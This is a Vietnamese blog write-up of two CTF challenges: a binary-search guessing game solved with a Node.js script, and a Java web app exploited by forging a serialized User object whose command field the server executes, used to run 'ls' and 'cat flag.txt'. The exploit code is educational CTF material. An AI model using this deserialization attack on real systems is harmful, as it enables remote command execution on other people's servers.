---
layout: post
title:  "[VI] WannaGame Freshman CTF 2022 @ UIT - Writeup"
date:   2022-10-12 14:00:00 +0700
permalink_name: "/2022-10-12_w1-freshman-ctf-writeup"
tags: personal ctf
---

Mình vừa tham gia CTF do InSecLab & Wanna.W^n @ Trường Đại học CNTT - ĐHQG HCM (UIT) tổ chức, và mình được giải nhì (hạng 3 @ K17 / hạng 4 @ all), một thứ hạng không hề tồi chút nào đối với 1 người:

- Trái ngành (mình ở ngành KHMT, và cuộc thi này mục tiêu nhắm chủ yếu vào ATTT (or not? idk))
- Thi CTF lần đầu tiên
<!-- still salty about losing 120 points tho -->

Trong cuộc thi này, mình đã giành được 2 first blood ở các challenge mà mình làm. Vì mình nghĩ rằng kiến thức để giải có thể có hữu ích cho người khác, nên mình đã viết cái writeup này để cho mọi người tham khảo. ~~(thực tế là bị ép buộc viết)~~

# Challenge: Zero-One Search

## 1. Problem statement

> Just connect to the server and you will know what to do.
> 
> nc 45.xxx.xxx.xxx xxxxx

----------

> Welcome to my challenge!!!
>
> In this challenge, you have to past 50 rounds, each round have 1 magic numbers.
>
> Your task is to guess that number.
> 
> You can ask me at most 10 questions.
> 
> Let's assume you want to know if magic number is in (1, 2, 3, 4, 5) list, then you have to send like "1 2 3 4 5", each seperate by a space.
>
> After that, you will receive two kind of answers.
>
> YES if the magic number is in the list you send me.
>
> NO if the magic number is not in the list you send me.
>
> After 10 turns, you will give me the final asnwer, if it is correct, you pass, if wrong, you lose.
>
> Good luck, hackers!!!

----------

Files included: [server.py](https://pastebin.com/mU8vzfke)

## 2. Solution

Dựa trên tên đề bài thì mình đã đoán được đây là 1 vấn đề cần phải sử dụng thuật toán Binary Search (zero, one không phải là 2 giá trị có thể có của binary sao?).

Tiếp theo, khi đọc code của server, mình phát hiện rằng "magic number" chính là 1 số nằm trong khoảng từ 0 đến 1023. Khoảng này vừa đủ để đoán trong 10 lượt (2<sup>10</sup> - 1024 giá trị).

```py
def quest(self):
        turns = 10
        magic_num = randint(0, 1023) # right here
        for i in range(turns):

            req = int(input(">>> "))
```

Sau khi biết được phải làm gì, mình đã viết một đoạn code Node.JS để vượt qua challenge này.

```js
let asyncTimeout = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

var net = require('net');
var client = new net.Socket();

client.connect(PORT_REDACTED, "45.xxx.xxx.xxx", async () => {
    console.log("Connected");

    function test(low, high) {
        return new Promise((resolve) => {
            let sendData = "";
            for (let i = low; i <= high; i++) {
                sendData += i + " ";
            }
            client.write(sendData + "\n");
            function handleData(d) {
                let data = Buffer.from(d);
                if (data.includes("YES") && !data.includes("NO")) {
                    resolve(true);
                    client.removeListener("data", handleData);
                } else if (data.includes("NO") && !data.includes("YES")) {
                    resolve(false);
                    client.removeListener("data", handleData);
                }
            }

            client.on("data", handleData);
        });
    }

    function submit(num) {
        return new Promise((resolve, reject) => {
            client.write(num + "\n");
            function handleData(d) {
                let data = d.toString();
                if (data.includes("Correct")) {
                    resolve();
                    client.removeListener("data", handleData);
                } else if (data.includes("Wrong")) {
                    reject(new Error("Wrong answer"));
                    client.removeListener("data", handleData);
                }
            }

            client.on("data", handleData);
        });
    }

    client.on("data", d => console.log(d.toString()));

    for (let x = 0; x < 50; x++) {
        let low = 1;
        let high = 1023;

        await asyncTimeout(1000);
        for (let i = 0; i < 10; i++) {
            // Log: Hỏi lần thử i, dự đoán khoảng số thấp nhất,
            // số nằm ở giữa (để chia 2 bên trái/phải) và số cao nhất trong khoảng.
            console.log(i, low, Math.floor((high + low - 1) / 2), high);
            let result = await test(low, Math.floor((high + low - 1) / 2));
            if (result) {
                high = Math.floor((high + low - 1) / 2);
            } else {
                low = Math.floor((high + low - 1) / 2) + 1;
            }
            await asyncTimeout(50);
        }

        // Sau 10 lần thử thì chắc chắn đã tìm ra số cần tìm.
        console.log("Submit:", low);
        await submit(low);

        await asyncTimeout(250);
    }
});
```

Và...

![image_flag_1](/assets/2022-10-12-w1-freshman-ctf-writeup/1.png)

*(ignore the wibu bg, thanks)*

SOLVED! `W1{Binary search is so scary, right?}`

# Challenge: What is the time?

## 1. Problem statement

> @to^
>
> I'm new to java, so i want to improve my skill via making a simple page which can help you to figure out what the current time is. Hope u guys enjoy it 🥰
> 
> Challenge here: http://45.xxx.xxx.xxx:xxxxx/app

Files included: [GiveToPlayer.zip](https://files.catbox.moe/wkgbqo.zip)

## 2. Solution

Ngay khi vừa đọc đề, mình đã vào thử web và đập vào mắt mình đó chính là 1 ô nhập tên, khi submit tên thì server trả về... một thứ gì đó được mã hóa, có thể submit thêm lần nữa. Uhh...

![image_witt_name](/assets/2022-10-12-w1-freshman-ctf-writeup/2.png)

![image_witt_code](/assets/2022-10-12-w1-freshman-ctf-writeup/3.png)

*(bruh)*

Submit tiếp thì ra time hiện tại. Hmmm...

![image_witt_time_nonhacked](/assets/2022-10-12-w1-freshman-ctf-writeup/4.png)

Mình tự nghĩ rằng: tại sao lại có thêm 1 bước trung gian, hiện thứ mã hóa ra để làm gì? That's doesn't make any sense! Chắc hẳn phải có gì đó mới làm thêm bước trung gian đó... 

Sau đó, mình tải source code của server về. Và giờ thì mình đã hiểu.

```java
public void Serialization(String name, PrintWriter out) throws IOException {
    ByteArrayOutputStream bos = new ByteArrayOutputStream();
    User A = new User(name);
    ObjectOutputStream oos = new ObjectOutputStream(bos);
    oos.writeObject(A);

    Base64.Encoder enc = Base64.getEncoder();
    byte[] encbytes = enc.encode(bos.toByteArray());
    out.println("<br><br>" +
            "<form method=post action='/app/server'>" +
            "<input type=hidden name='action' value='deserialize'>" +
            "<input type=text name='base64String' size=100 value='" + new String(encbytes) + "'>" +
            "<br><input type=submit>" +
            "</form>");
    oos.close();
    bos.close();
}
```

Đoạn mã hóa kia chính là 1 object của Java nhưng đã được serialized.

```java
class User implements Serializable
{
    String name;
    String command;

    public User(String name)
    {
        this.name = name;
        this.command = "date";
    }
```

Wait, command để thực thi mà lại để ở object User? VÀ OBJECT ĐÓ LẠI ĐƯỢC LẤY TỪ USER INPUT MÀ KHÔNG HỀ SANITIZE? Đấy đúng là công thức để tạo ra một lỗ hổng RCE/ACE mà.

Bằng cách tạo một serialized `User` object với `this.command` được thay đổi thành giá trị mình muốn, mình đã thực thi thành công bất kì lệnh nào mình muốn.

```java
class App {
    public static void main(String[] args) throws Exception {
        try {
            // Serialization
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            User A = new User("CTF_BadAimWeeb");
            A.command = "<điền lệnh muốn chạy vào đây>";
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(A);

            Base64.Encoder enc = Base64.getEncoder();
            byte[] encbytes = enc.encode(bos.toByteArray());

            // output the serialized object
            System.out.println("");
            System.out.println(new String(encbytes));

            bos.close();
            oos.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![image_witt_maliciouscode](/assets/2022-10-12-w1-freshman-ctf-writeup/5.png)

Vậy là mình đã tạo ra code để gửi lên server rồi. Kiểm tra thử xem ở CWD có file nào thú vị không (`ls` ofc)...

![image_witt_time_hijacked](/assets/2022-10-12-w1-freshman-ctf-writeup/6.png)

Ah, `flag.txt` đây rồi, giờ chỉ việc đọc file thôi (`cat flag.txt`)...

![image_witt_time_flag](/assets/2022-10-12-w1-freshman-ctf-writeup/7.png)

SOLVED! `W1{java_deserialization_for_beginner}`
